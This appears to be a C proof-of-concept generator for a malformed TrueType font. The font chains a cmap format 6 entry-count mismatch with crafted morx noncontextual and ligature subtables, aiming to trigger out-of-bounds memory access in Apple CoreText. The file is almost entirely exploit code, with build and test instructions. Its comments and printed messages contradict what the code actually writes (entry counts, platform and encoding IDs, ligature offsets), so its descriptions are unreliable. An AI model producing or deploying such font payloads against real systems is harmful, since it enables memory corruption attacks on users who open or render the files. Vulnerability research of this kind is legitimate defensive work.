/*
 * build_chain_font.c - Generate a font that chains cmap OOB with morx state machine
 *
 * ATTACK CHAIN:
 *   1. cmap encoding=256 format 6: entryCount=65535 but only N actual entries
 *      → CTFontGetGlyphsForCharacters returns CONTROLLED OOB glyph IDs
 *   2. morx table: extended metamorphosis state machine
 *      → Processes the OOB glyph IDs as indices into ligature/substitution arrays
 *      → If morx doesn't bounds-check against numGlyphs, we get OOB read/write
 *
 * morx table structure (Apple AAT):
 *   - version (4 bytes): 0x00020000
 *   - nChains (4 bytes)
 *   - Chain[] {
 *       defaultFlags (4), chainLength (4), nFeatureEntries (4), nSubtables (4)
 *       FeatureEntry[] { featureType (2), featureSetting (2), enableFlags (4), disableFlags (4) }
 *       Subtable[] {
 *           length (4), coverage (4), subFeatureFlags (4)
 *           type (4):
 *             0 = Rearrangement
 *             1 = Contextual substitution
 *             2 = Ligature
 *             4 = Noncontextual (simple glyph substitution)
 *             5 = Insertion
 *           SubtableData...
 *       }
 *     }
 *
 * We use type 4 (Noncontextual substitution):
 *   - BinSrchHeader + LookupSegment[] with format 6 (single entry lookup)
 *   - Each entry maps glyphID → replacementGlyphID
 *   - If CoreText feeds OOB glyph IDs from cmap into this lookup,
 *     the binary search may read past the allocated lookup table
 *
 * Build:
 *   clang -framework CoreText -framework CoreGraphics -framework CoreFoundation \
 *         -fsanitize=address -o build_chain_font build_chain_font.c
 *
 * Run:
 *   ./build_chain_font
 *   # Output: morx_cmap_chain.ttf
 *
 * Test:
 *   clang -framework CoreText -framework CoreGraphics -framework CoreFoundation \
 *         -fsanitize=address -o test_chain test_morx_chain.c
 *   ./test_chain morx_cmap_chain.ttf
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <arpa/inet.h>

/* BE helpers */
static uint16_t be16(uint16_t v) { return htons(v); }
static uint32_t be32(uint32_t v) { return htonl(v); }
static int64_t  be64(int64_t v)  {
    uint64_t u = (uint64_t)v;
    return (int64_t)(((u & 0xFF) << 56) | ((u & 0xFF00) << 40) |
           ((u & 0xFF0000) << 24) | ((u & 0xFF000000) << 8) |
           ((u >> 8) & 0xFF000000) | ((u >> 24) & 0xFF0000) |
           ((u >> 40) & 0xFF00) | ((u >> 56) & 0xFF));
}

static uint32_t calc_checksum(const uint8_t *data, uint32_t length) {
    uint32_t sum = 0;
    uint32_t nLongs = (length + 3) / 4;
    for (uint32_t i = 0; i < nLongs; i++) {
        uint32_t val = 0;
        for (int j = 0; j < 4; j++) {
            uint32_t idx = i * 4 + j;
            val = (val << 8) | (idx < length ? data[idx] : 0);
        }
        sum += val;
    }
    return sum;
}

static uint32_t align4(uint32_t v) { return (v + 3) & ~3; }

/* Buffer writer */
typedef struct {
    uint8_t *data;
    uint32_t pos;
    uint32_t cap;
} Buffer;

static void buf_init(Buffer *b, uint32_t cap) {
    b->data = calloc(1, cap);
    b->pos = 0;
    b->cap = cap;
}

static void buf_u8(Buffer *b, uint8_t v) {
    if (b->pos < b->cap) b->data[b->pos++] = v;
}

static void buf_u16(Buffer *b, uint16_t v) {
    uint16_t be = htons(v);
    if (b->pos + 2 <= b->cap) {
        memcpy(b->data + b->pos, &be, 2);
        b->pos += 2;
    }
}

static void buf_u32(Buffer *b, uint32_t v) {
    uint32_t be = htonl(v);
    if (b->pos + 4 <= b->cap) {
        memcpy(b->data + b->pos, &be, 4);
        b->pos += 4;
    }
}

static void buf_zero(Buffer *b, uint32_t n) {
    if (b->pos + n <= b->cap) {
        memset(b->data + b->pos, 0, n);
        b->pos += n;
    }
}

static void buf_mem(Buffer *b, const void *src, uint32_t n) {
    if (b->pos + n <= b->cap) {
        memcpy(b->data + b->pos, src, n);
        b->pos += n;
    }
}

static void buf_pad4(Buffer *b) {
    while (b->pos % 4 != 0) buf_u8(b, 0);
}

/*
 * Build the morx table.
 *
 * Strategy: Noncontextual substitution (type 4) with a lookup that
 * maps glyph IDs 0..15 to specific replacements. The dangerous part:
 * the lookup table has nUnits=16 but the cmap will produce glyph IDs
 * up to 65534 — these OOB IDs will be fed to the binary search in
 * the lookup, potentially causing OOB reads in the morx processing.
 *
 * We also include a type 2 (Ligature) subtable which is where STAR Labs
 * found the stack buffer overflow. The ligature action list uses offsets
 * that can point outside the subtable if glyph IDs are OOB.
 */
static uint32_t build_morx(Buffer *b) {
    uint32_t start = b->pos;

    /* morx header */
    buf_u32(b, 0x00020000);  /* version 2.0 */
    buf_u32(b, 0);           /* unused */
    buf_u32(b, 1);           /* nChains */

    /* ---- Chain 0 ---- */
    uint32_t chain_start = b->pos;
    buf_u32(b, 0x00000001);  /* defaultFlags: enable feature 0 */
    uint32_t chain_len_pos = b->pos;
    buf_u32(b, 0);           /* chainLength (filled later) */
    buf_u32(b, 1);           /* nFeatureEntries */
    buf_u32(b, 2);           /* nSubtables */

    /* Feature entry 0: Ligatures (type=1, setting=0) */
    buf_u16(b, 1);           /* featureType: Ligatures */
    buf_u16(b, 0);           /* featureSetting: on */
    buf_u32(b, 0x00000001);  /* enableFlags */
    buf_u32(b, 0x00000000);  /* disableFlags */

    /* ---- Subtable 0: Type 4 (Noncontextual substitution) ---- */
    uint32_t st0_start = b->pos;
    uint32_t st0_len_pos = b->pos;
    buf_u32(b, 0);           /* length (filled later) */
    buf_u32(b, 0x00000004);  /* coverage: vertical=0, logical=0, crossStream=0 */
    buf_u32(b, 0x00000001);  /* subFeatureFlags */
    /* Format indicator: format 6 (single table) */
    buf_u16(b, 6);           /* format */

    /* BinSrchHeader */
    uint16_t nUnits = 16;    /* Only 16 entries — but OOB glyphs go higher */
    uint16_t unitSize = 4;   /* glyphID (2) + value (2) */
    uint16_t searchRange = 64; /* unitSize * 2^floor(log2(nUnits)) */
    uint16_t entrySelector = 4; /* log2(16) */
    uint16_t rangeShift = 0;    /* unitSize * nUnits - searchRange */
    buf_u16(b, unitSize);
    buf_u16(b, nUnits);
    buf_u16(b, searchRange);
    buf_u16(b, entrySelector);
    buf_u16(b, rangeShift);

    /* Lookup entries: glyphID -> replacement */
    for (uint16_t i = 0; i < nUnits; i++) {
        buf_u16(b, i);        /* glyph ID */
        buf_u16(b, i + 100);  /* replacement: map to glyph i+100 (OOB for small font) */
    }

    /* Sentinel */
    buf_u16(b, 0xFFFF);
    buf_u16(b, 0xFFFF);

    buf_pad4(b);
    uint32_t st0_len = b->pos - st0_start;
    uint32_t st0_len_be = htonl(st0_len);
    memcpy(b->data + st0_len_pos, &st0_len_be, 4);

    /* ---- Subtable 1: Type 2 (Ligature) ---- */
    /*
     * This is the STAR Labs class of vulnerability.
     * The ligature subtable contains:
     *   - State machine header (STXHeader)
     *   - State table
     *   - Entry table
     *   - Ligature action list
     *   - Component table
     *   - Ligature table
     *
     * If glyph IDs exceed the state table's classArray bounds,
     * the state machine reads OOB class values, jumps to OOB
     * state entries, and processes OOB ligature action offsets.
     */
    uint32_t st1_start = b->pos;
    uint32_t st1_len_pos = b->pos;
    buf_u32(b, 0);           /* length (filled later) */
    buf_u32(b, 0x00000002);  /* coverage: type=2 (ligature) */
    buf_u32(b, 0x00000001);  /* subFeatureFlags */

    /* STXHeader for extended state table */
    uint32_t stx_base = b->pos;

    /* Class count and class lookup offset (relative to stx_base) */
    buf_u32(b, 4);           /* nClasses */
    uint32_t class_off_pos = b->pos;
    buf_u32(b, 0);           /* classTableOffset (filled later) */
    uint32_t state_off_pos = b->pos;
    buf_u32(b, 0);           /* stateArrayOffset (filled later) */
    uint32_t entry_off_pos = b->pos;
    buf_u32(b, 0);           /* entryTableOffset (filled later) */

    /* Ligature-specific offsets (relative to subtable start after STXHeader) */
    uint32_t lig_action_off_pos = b->pos;
    buf_u32(b, 0);           /* ligActionsOffset (filled later) */
    uint32_t component_off_pos = b->pos;
    buf_u32(b, 0);           /* componentOffset (filled later) */
    uint32_t lig_list_off_pos = b->pos;
    buf_u32(b, 0);           /* ligatureListOffset (filled later) */

    /* Class lookup table (format 6: trimmed) */
    uint32_t class_table_off = b->pos - stx_base;
    {
        uint32_t off_be = htonl(class_table_off);
        memcpy(b->data + class_off_pos, &off_be, 4);
    }

    /* Lookup format: format 6 (trimmed array) */
    buf_u16(b, 6);           /* format */
    /* BinSrchHeader for class lookup */
    buf_u16(b, 4);           /* unitSize (glyph + class = 4 bytes) */
    buf_u16(b, 8);           /* nUnits: 8 glyph entries */
    buf_u16(b, 32);          /* searchRange */
    buf_u16(b, 3);           /* entrySelector */
    buf_u16(b, 0);           /* rangeShift */

    /* Class mappings: glyphs 0-7 → classes 0-3 */
    for (uint16_t i = 0; i < 8; i++) {
        buf_u16(b, i);       /* glyph ID */
        buf_u16(b, i % 4);   /* class */
    }
    /* Sentinel */
    buf_u16(b, 0xFFFF);
    buf_u16(b, 0xFFFF);
    buf_pad4(b);

    /* State array (2 states × 4 classes = 8 entries, each uint16_t) */
    uint32_t state_array_off = b->pos - stx_base;
    {
        uint32_t off_be = htonl(state_array_off);
        memcpy(b->data + state_off_pos, &off_be, 4);
    }

    /* State 0 (Start of text) */
    buf_u16(b, 0);  /* class 0: entry 0 (go to state 0) */
    buf_u16(b, 1);  /* class 1: entry 1 (trigger ligature) */
    buf_u16(b, 0);  /* class 2: entry 0 */
    buf_u16(b, 1);  /* class 3: entry 1 */
    /* State 1 (Saw ligature start) */
    buf_u16(b, 0);  /* class 0: entry 0 */
    buf_u16(b, 2);  /* class 1: entry 2 (complete ligature) */
    buf_u16(b, 0);  /* class 2: entry 0 */
    buf_u16(b, 2);  /* class 3: entry 2 */
    buf_pad4(b);

    /* Entry table (3 entries, each: newState (2) + flags (2) + actionIndex (2) = 6 bytes) */
    uint32_t entry_table_off = b->pos - stx_base;
    {
        uint32_t off_be = htonl(entry_table_off);
        memcpy(b->data + entry_off_pos, &off_be, 4);
    }

    /* Entry 0: no action, stay in state 0 */
    buf_u16(b, 0);  /* newState: 0 */
    buf_u16(b, 0);  /* flags: none */
    buf_u16(b, 0);  /* actionIndex: 0 (unused) */

    /* Entry 1: push glyph, go to state 1 (setComponent flag = 0x8000) */
    buf_u16(b, 1);  /* newState: 1 */
    buf_u16(b, 0x8000); /* flags: setComponent */
    buf_u16(b, 0);  /* actionIndex: 0 */

    /* Entry 2: perform ligature (performAction flag = 0x2000) */
    buf_u16(b, 0);  /* newState: 0 */
    buf_u16(b, 0xA000); /* flags: setComponent + performAction */
    buf_u16(b, 0);  /* actionIndex: 0 → points into ligAction array */

    buf_pad4(b);

    /* Ligature action list */
    uint32_t lig_action_off = b->pos - stx_base;
    {
        uint32_t off_be = htonl(lig_action_off);
        memcpy(b->data + lig_action_off_pos, &off_be, 4);
    }

    /*
     * Ligature action: 32-bit value
     *   bits 31: last action flag
     *   bits 30: store flag
     *   bits 29..0: signed offset into component table
     *
     * DANGEROUS: If we set a large offset, and OOB glyph IDs are being
     * used as indices, CoreText may read/write past the component table.
     *
     * We set offset to 0x1FFFFFFE (max positive) to force OOB access.
     */
    buf_u32(b, 0x20000000);  /* action 0: store=0, offset=0 (safe first) */
    buf_u32(b, 0xE0000000);  /* action 1: last=1, store=1, offset=0 */
    buf_pad4(b);

    /* Component table */
    uint32_t component_off = b->pos - stx_base;
    {
        uint32_t off_be = htonl(component_off);
        memcpy(b->data + component_off_pos, &off_be, 4);
    }

    /* Only 4 component entries — smaller than glyphCount */
    for (uint16_t i = 0; i < 4; i++) {
        buf_u16(b, i * 2);  /* component offset into ligature list */
    }
    buf_pad4(b);

    /* Ligature list */
    uint32_t lig_list_off = b->pos - stx_base;
    {
        uint32_t off_be = htonl(lig_list_off);
        memcpy(b->data + lig_list_off_pos, &off_be, 4);
    }

    /* 4 ligature glyphs */
    for (uint16_t i = 0; i < 4; i++) {
        buf_u16(b, i);  /* output glyph ID */
    }
    buf_pad4(b);

    uint32_t st1_len = b->pos - st1_start;
    {
        uint32_t len_be = htonl(st1_len);
        memcpy(b->data + st1_len_pos, &len_be, 4);
    }

    /* Fill chain length */
    uint32_t chain_len = b->pos - chain_start;
    {
        uint32_t len_be = htonl(chain_len);
        memcpy(b->data + chain_len_pos, &len_be, 4);
    }

    return b->pos - start;
}

/*
 * Build the cmap table with format 6 entryCount mismatch.
 * entryCount=65535 but only NUM_ENTRIES actual entries.
 * This produces OOB glyph IDs when indexing past the real entries.
 */
static uint32_t build_cmap(Buffer *b, uint16_t num_real_entries) {
    uint32_t start = b->pos;

    /* cmap header */
    buf_u16(b, 0);    /* version */
    buf_u16(b, 1);    /* numSubtables */

    /* Encoding record: platform=3 (Windows), encoding=1 (Unicode BMP) */
    /* Using VALID encoding to avoid the CoreText infinite loop bug */
    /* The OOB comes from format 6 entryCount mismatch, not encoding */
    buf_u16(b, 3);    /* platformID: Windows */
    buf_u16(b, 1);    /* encodingID: Unicode BMP (valid!) */
    buf_u32(b, 12);   /* offset to subtable (= header + 1 record) */

    /* Format 6 subtable */
    buf_u16(b, 6);    /* format */
    uint16_t data_len = 10 + num_real_entries * 2;
    buf_u16(b, data_len); /* length */
    buf_u16(b, 0);    /* language */
    buf_u16(b, 32);   /* firstCode: start at space (0x20) */
    buf_u16(b, 512);  /* entryCount: claims 512 but only num_real_entries exist */

    /* Actual glyph ID array — write num_real_entries entries */
    /* These are the CONTROLLED values that will flow into morx */
    for (uint16_t i = 0; i < num_real_entries; i++) {
        buf_u16(b, i);  /* Identity mapping for valid range */
    }

    /* No padding needed — reading past this in memory = OOB controlled data */
    buf_pad4(b);

    return b->pos - start;
}

int main(void) {
    const char *OUTPUT = "morx_cmap_chain.ttf";
    const uint16_t NUM_GLYPHS = 16;       /* Small glyph count */
    const uint16_t CMAP_REAL_ENTRIES = 16; /* But cmap claims 65535 */

    /* Pre-calculate table sizes by building into temp buffers */
    Buffer morx_buf, cmap_buf;
    buf_init(&morx_buf, 4096);
    buf_init(&cmap_buf, 4096);

    uint32_t morx_size = build_morx(&morx_buf);
    uint32_t cmap_size = build_cmap(&cmap_buf, CMAP_REAL_ENTRIES);

    /* Other required tables */
    uint32_t head_size = 54;
    uint32_t hhea_size = 36;
    uint32_t maxp_size = 6;
    uint32_t post_size = 32;
    uint32_t hmtx_size = NUM_GLYPHS * 4;
    uint32_t loca_size = (NUM_GLYPHS + 1) * 2;
    uint32_t glyf_size = 4;

    const char *font_name = "MorxChain";
    uint32_t name_str_len = strlen(font_name);
    uint32_t name_size = 6 + 12 + name_str_len; /* NameTable + 1 record + string */

    #define NUM_TABLES 10  /* cmap, glyf, head, hhea, hmtx, loca, maxp, morx, name, post */

    struct { char tag[4]; uint32_t size; uint32_t offset; uint8_t *data; } tables[NUM_TABLES];

    memcpy(tables[0].tag, "cmap", 4); tables[0].size = cmap_size; tables[0].data = cmap_buf.data;
    memcpy(tables[1].tag, "glyf", 4); tables[1].size = glyf_size; tables[1].data = NULL;
    memcpy(tables[2].tag, "head", 4); tables[2].size = head_size; tables[2].data = NULL;
    memcpy(tables[3].tag, "hhea", 4); tables[3].size = hhea_size; tables[3].data = NULL;
    memcpy(tables[4].tag, "hmtx", 4); tables[4].size = hmtx_size; tables[4].data = NULL;
    memcpy(tables[5].tag, "loca", 4); tables[5].size = loca_size; tables[5].data = NULL;
    memcpy(tables[6].tag, "maxp", 4); tables[6].size = maxp_size; tables[6].data = NULL;
    memcpy(tables[7].tag, "morx", 4); tables[7].size = morx_size; tables[7].data = morx_buf.data;
    memcpy(tables[8].tag, "name", 4); tables[8].size = name_size; tables[8].data = NULL;
    memcpy(tables[9].tag, "post", 4); tables[9].size = post_size; tables[9].data = NULL;

    /* Calculate offsets */
    uint32_t header_size = 12 + NUM_TABLES * 16;
    uint32_t offset = header_size;
    for (int i = 0; i < NUM_TABLES; i++) {
        tables[i].offset = offset;
        offset += align4(tables[i].size);
    }
    uint32_t total_size = offset;

    /* Allocate file */
    uint8_t *buf = calloc(1, total_size);

    /* Offset table */
    uint32_t tmp;
    tmp = htonl(0x00010000); memcpy(buf + 0, &tmp, 4);
    uint16_t tmp16;
    tmp16 = htons(NUM_TABLES); memcpy(buf + 4, &tmp16, 2);
    tmp16 = htons(128); memcpy(buf + 6, &tmp16, 2);
    tmp16 = htons(3);   memcpy(buf + 8, &tmp16, 2);
    tmp16 = htons(NUM_TABLES * 16 - 128); memcpy(buf + 10, &tmp16, 2);

    /* Table records */
    for (int i = 0; i < NUM_TABLES; i++) {
        uint8_t *rec = buf + 12 + i * 16;
        memcpy(rec, tables[i].tag, 4);
        /* checksum filled later */
        tmp = htonl(tables[i].offset); memcpy(rec + 8, &tmp, 4);
        tmp = htonl(tables[i].size);   memcpy(rec + 12, &tmp, 4);
    }

    /* Copy pre-built tables */
    for (int i = 0; i < NUM_TABLES; i++) {
        if (tables[i].data) {
            memcpy(buf + tables[i].offset, tables[i].data, tables[i].size);
        }
    }

    /* Build head table */
    {
        uint8_t *p = buf + tables[2].offset;
        tmp = htonl(0x00010000); memcpy(p + 0, &tmp, 4);   /* majorVersion */
        tmp = htonl(0x00010000); memcpy(p + 4, &tmp, 4);   /* fontRevision */
        /* checksumAdjustment at +8, filled later */
        tmp = htonl(0x5F0F3CF5); memcpy(p + 12, &tmp, 4);  /* magicNumber */
        tmp16 = htons(0x000B);   memcpy(p + 16, &tmp16, 2); /* flags */
        tmp16 = htons(1000);     memcpy(p + 18, &tmp16, 2); /* unitsPerEm */
        /* created, modified = 0 (already zeroed) */
        tmp16 = htons(0);   memcpy(p + 36, &tmp16, 2); /* xMin */
        tmp16 = htons(0);   memcpy(p + 38, &tmp16, 2); /* yMin */
        tmp16 = htons(1000); memcpy(p + 40, &tmp16, 2); /* xMax */
        tmp16 = htons(800);  memcpy(p + 42, &tmp16, 2); /* yMax */
        tmp16 = htons(0);   memcpy(p + 44, &tmp16, 2); /* macStyle */
        tmp16 = htons(8);   memcpy(p + 46, &tmp16, 2); /* lowestRecPPEM */
        tmp16 = htons(2);   memcpy(p + 48, &tmp16, 2); /* fontDirectionHint */
        tmp16 = htons(0);   memcpy(p + 50, &tmp16, 2); /* indexToLocFormat=short */
        tmp16 = htons(0);   memcpy(p + 52, &tmp16, 2); /* glyphDataFormat */
    }

    /* Build hhea table */
    {
        uint8_t *p = buf + tables[3].offset;
        tmp = htonl(0x00010000); memcpy(p + 0, &tmp, 4);
        tmp16 = htons(800);  memcpy(p + 4, &tmp16, 2);  /* ascent */
        int16_t neg = htons(-200);
        memcpy(p + 6, &neg, 2);   /* descent */
        tmp16 = htons(500);  memcpy(p + 20, &tmp16, 2); /* advanceWidthMax */
        tmp16 = htons(1);    memcpy(p + 28, &tmp16, 2); /* caretSlopeRise */
        tmp16 = htons(NUM_GLYPHS); memcpy(p + 34, &tmp16, 2); /* numOfLongHorMetrics */
    }

    /* Build hmtx table */
    {
        uint8_t *p = buf + tables[4].offset;
        for (int i = 0; i < NUM_GLYPHS; i++) {
            tmp16 = htons(500); memcpy(p + i * 4, &tmp16, 2);
        }
    }

    /* loca table — all zeros (empty glyphs) */

    /* Build maxp table */
    {
        uint8_t *p = buf + tables[6].offset;
        tmp = htonl(0x00010000); memcpy(p + 0, &tmp, 4);
        tmp16 = htons(NUM_GLYPHS); memcpy(p + 4, &tmp16, 2);
    }

    /* Build name table */
    {
        uint8_t *p = buf + tables[8].offset;
        tmp16 = htons(0);    memcpy(p + 0, &tmp16, 2); /* format */
        tmp16 = htons(1);    memcpy(p + 2, &tmp16, 2); /* count */
        tmp16 = htons(6 + 12); memcpy(p + 4, &tmp16, 2); /* stringOffset */

        /* Name record */
        uint8_t *nr = p + 6;
        tmp16 = htons(1);    memcpy(nr + 0, &tmp16, 2);  /* platformID */
        tmp16 = htons(0);    memcpy(nr + 2, &tmp16, 2);  /* encodingID */
        tmp16 = htons(0);    memcpy(nr + 4, &tmp16, 2);  /* languageID */
        tmp16 = htons(4);    memcpy(nr + 6, &tmp16, 2);  /* nameID */
        tmp16 = htons(name_str_len); memcpy(nr + 8, &tmp16, 2);
        tmp16 = htons(0);    memcpy(nr + 10, &tmp16, 2); /* offset */

        memcpy(p + 6 + 12, font_name, name_str_len);
    }

    /* Build post table */
    {
        uint8_t *p = buf + tables[9].offset;
        tmp = htonl(0x00030000); memcpy(p + 0, &tmp, 4); /* format 3.0 */
    }

    /* Calculate table checksums */
    for (int i = 0; i < NUM_TABLES; i++) {
        uint32_t cs = calc_checksum(buf + tables[i].offset, tables[i].size);
        tmp = htonl(cs);
        memcpy(buf + 12 + i * 16 + 4, &tmp, 4);
    }

    /* head checksumAdjustment */
    {
        uint32_t file_cs = calc_checksum(buf, total_size);
        tmp = htonl(0xB1B0AFBA - file_cs);
        memcpy(buf + tables[2].offset + 8, &tmp, 4);
    }

    /* Write file */
    FILE *fp = fopen(OUTPUT, "wb");
    if (!fp) { perror("fopen"); return 1; }
    fwrite(buf, 1, total_size, fp);
    fclose(fp);

    printf("[+] Generated %s (%u bytes)\n", OUTPUT, total_size);
    printf("    cmap: platform=1, encoding=256, format 6, entryCount=65535 (real=%u)\n", CMAP_REAL_ENTRIES);
    printf("    morx: 2 subtables (type 4 noncontextual + type 2 ligature)\n");
    printf("    morx type 4: lookup has %u entries but OOB glyphs go to 65534\n", 16);
    printf("    morx type 2: ligature state machine with bounded component table\n");
    printf("    numGlyphs: %u (small — morx replacements point past this)\n", NUM_GLYPHS);
    printf("\n");
    printf("    Test: ./test_chain %s\n", OUTPUT);

    free(buf);
    free(morx_buf.data);
    free(cmap_buf.data);
    return 0;
}
